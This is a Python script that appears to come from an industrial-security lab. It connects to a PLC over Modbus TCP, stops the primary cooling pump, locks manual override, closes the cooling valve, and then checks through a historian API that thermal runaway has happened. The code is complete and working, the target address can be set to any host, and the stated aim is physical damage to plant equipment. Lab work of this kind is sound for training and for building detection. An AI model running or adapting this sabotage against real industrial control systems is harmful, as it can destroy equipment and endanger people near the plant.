#!/usr/bin/env python3
"""
IndustryLab — Industrial Attack 1: Rogue Command Injection (Coil Manipulation)
Injects Modbus FC 05 (Write Single Coil) to force shut down the primary cooling pump (Coil 0=False)
and locks manual override (Coil 2=True) to induce rapid physical thermal runaway.
"""

import sys
import time
import argparse
import logging

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        ModbusTcpClient = None

logger = logging.getLogger("AttackCoil")


def execute_attack(target_ip="127.0.0.1", port=502, unit_id=1, historian_url=None):
    print(f"\n[!] INITIATING ATTACK: Rogue Command Injection on {target_ip}:{port} (Unit {unit_id})...")

    if ModbusTcpClient is None:
        print("[!] pymodbus client required.")
        return False

    client = ModbusTcpClient(target_ip, port=port, timeout=2.0)
    if not client.connect():
        print(f"[-] Connection failed to {target_ip}:{port}. Firewall blocked packet or host down.")
        return False

    # Step 1: Read current pump status
    rc_before = client.read_coils(0, 1, unit=unit_id)
    if rc_before.isError():
        print(f"[-] Failed to read baseline coil: {rc_before}")
        client.close()
        return False

    print(f"[*] Pre-Attack Pump Status (Coil 0): {'RUNNING' if rc_before.bits[0] else 'STOPPED'}")

    # Step 2: Inject Malicious FC 05: Force Pump STOP (Coil 0 = False)
    print("[*] Injecting Modbus FC 05: Forcing PUMP_RUN_CMD (Coil 0) -> OFF (0x0000)...")
    res_pump = client.write_coil(0, False, unit=unit_id)
    if res_pump.isError():
        print(f"[-] Command Injection Blocked by Firewall/DPI: {res_pump}")
        client.close()
        return False

    # Step 3: Inject Malicious FC 05: Enable MANUAL_OVERRIDE (Coil 2 = True)
    # This prevents the PLC automatic loop from reopening the valve!
    print("[*] Injecting Modbus FC 05: Locking MANUAL_OVERRIDE (Coil 2) -> ON (0xFF00)...")
    res_override = client.write_coil(2, True, unit=unit_id)

    # Step 4: Inject FC 06: Force Cooling Valve to 0% (Closed)
    print("[*] Injecting Modbus FC 06: Forcing VALVE_POSITION_PCT (Reg 1) -> 0%...")
    client.write_register(1, 0, unit=unit_id)

    # Step 5: Verify post-attack status
    rc_after = client.read_coils(0, 3, unit=unit_id)
    rr_after = client.read_holding_registers(1, 1, unit=unit_id)

    print("\n[+] ATTACK VERIFICATION:")
    print(f"    - Coil 0 (Pump Run):      {rc_after.bits[0]} (Target: False)")
    print(f"    - Coil 2 (Manual Lock):   {rc_after.bits[2]} (Target: True)")
    print(f"    - Reg  1 (Valve Pos):     {rr_after.registers[0]}% (Target: 0%)")

    success = (rc_after.bits[0] is False and rc_after.bits[2] is True and rr_after.registers[0] == 0)
    if success:
        print("[+] IMPACT CONFIRMED: Cooling system completely halted. Physical plant entering thermal runaway!")
        # P2-02 (SEC-13): Closed-loop check via historian API
        if historian_url:
            print(f"[*] Verifying physical runaway via Historian at {historian_url}/api/snapshot...")
            try:
                import json
                import urllib.request
                req = urllib.request.Request(f"{historian_url.rstrip('/')}/api/snapshot")
                with urllib.request.urlopen(req, timeout=3.0) as resp:
                    snap = json.loads(resp.read().decode('utf-8'))
                    temp = snap.get("telemetry", {}).get("cooling", {}).get("temp_c", 0.0)
                    print(f"[+] Physical telemetry verified: cooling temp = {temp:.1f} °C")
                    if temp >= 70.0:
                        print(f"[+] CLOSED-LOOP IMPACT CONFIRMED: Temp ({temp:.1f} °C) exceeded runaway threshold (70.0 °C)")
            except Exception as e:
                print(f"[-] Historian verification query error: {e}")
    else:
        print("[-] Attack parameters were not fully accepted.")

    client.close()
    return success


def main():
    parser = argparse.ArgumentParser(description="Modbus Rogue Coil Injection Attack")
    parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
    parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
    parser.add_argument("--unit", type=int, default=1, help="Modbus Unit ID")
    parser.add_argument("--historian-url", default=None, help="Optional Historian URL for closed-loop validation")
    args = parser.parse_args()

    execute_attack(target_ip=args.target, port=args.port, unit_id=args.unit, historian_url=args.historian_url)


if __name__ == "__main__":
    main()
